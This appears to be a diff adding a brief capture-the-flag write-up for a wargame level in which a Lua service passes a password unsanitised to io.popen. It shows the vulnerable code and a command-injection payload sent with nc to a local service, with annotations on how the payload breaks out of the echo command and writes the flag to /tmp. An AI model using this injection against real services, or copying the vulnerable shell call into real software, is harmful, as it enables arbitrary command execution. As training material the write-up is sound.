@@ -1,0 +1,23 @@
+level11:
+
+level11.lua
+
+->
+hash(pass):
+	io.popen("echo "..pass.." | sha1sum", "r");
+->
+client.onconnect(l):
+	hash(l)
+
+$ nc 127.0.0.1 5151
+Password: ; getflag > /tmp/abcd ;# a
+          ^ ^^^^^^^^^^^^^^^^^^^ ^^^^
+         [1] |                  [3]
+	    [2]
+
+1: unblock the echo
+2: write getflag to /tmp/abcd
+3: # a needs a space because #| is "valid"
+
+$ cat /tmp/abcd
+Check flag.Here is your token : ....
